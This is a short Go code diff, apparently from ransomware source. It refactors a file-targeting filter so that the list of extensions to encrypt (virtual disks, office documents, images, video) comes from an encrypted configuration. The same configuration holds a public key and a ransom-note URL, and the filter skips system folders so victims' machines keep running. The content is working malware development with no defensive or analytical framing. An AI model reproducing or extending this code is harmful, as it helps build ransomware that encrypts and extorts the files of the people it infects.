@@ -64,7 +64,7 @@ func filter(path string) int8 {
 	lowPath := strings.ToLower(path)
 
 	innerList := []string{"windows", "program", "appdata", "system"}
-	suffixList := []string{".vmdk", ".txt", ".zip", ".rar", ".7z", ".doc", ".docx", ".ppt", ".pptx", ".xls", ".xlsx", ".jpg", ".gif", ".jpeg", ".png", ".mpg", ".mov", ".mp4", ".avi", ".mp3"}
+	suffixList := settings.EncSuffixList
 
 	for _, inner := range innerList {
 		if strings.Contains(lowPath, inner) {
@@ -118,6 +118,9 @@ type Config struct {
 
 	ReadmeUrl         string
 	ReadmeNetFilename string
+
+	EncSuffix     string
+	EncSuffixList []string
 }
 
 func (self *Config) init(EncData string) {
@@ -134,4 +137,5 @@ func (self *Config) init(EncData string) {
 	json.Unmarshal(data, self)
 
 	self.PubKey = "\n" + self.PubKey
+	self.EncSuffixList = strings.Split(self.EncSuffix, "|")
 }
